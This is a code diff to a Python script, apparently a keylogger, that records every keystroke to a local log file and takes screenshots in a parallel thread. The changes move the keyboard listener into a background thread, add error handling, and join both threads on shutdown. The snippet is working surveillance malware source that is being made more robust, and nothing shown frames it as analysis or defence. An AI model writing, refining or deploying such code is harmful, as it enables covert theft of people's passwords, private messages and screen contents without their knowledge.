@@ -15,17 +15,22 @@ running = True  # control flag
 
 def log_keystrokes():
     def on_press(key):
-        if not running:
-            return False
         try:
             with open(log_file, "a") as f:
-                f.write(f"{key.char}")
+                f.write(key.char)
         except AttributeError:
             with open(log_file, "a") as f:
-                f.write(f" [{key}] ")
+                f.write(f"[{key}]")
+        except Exception as e:
+            print(f"Error logging key: {e}")
 
-    with keyboard.Listener(on_press=on_press) as listener:
-        listener.join()
+    listener = keyboard.Listener(on_press=on_press)
+    listener.start()
+
+    while running:
+        time.sleep(1)
+
+    listener.stop()
 
 def capture_screenshots():
     count = 0
@@ -48,4 +53,6 @@ try:
 except KeyboardInterrupt:
     print("\nStopping keylogger...")
     running = False
+    t1.join()
+    t2.join()
     sys.exit(0)
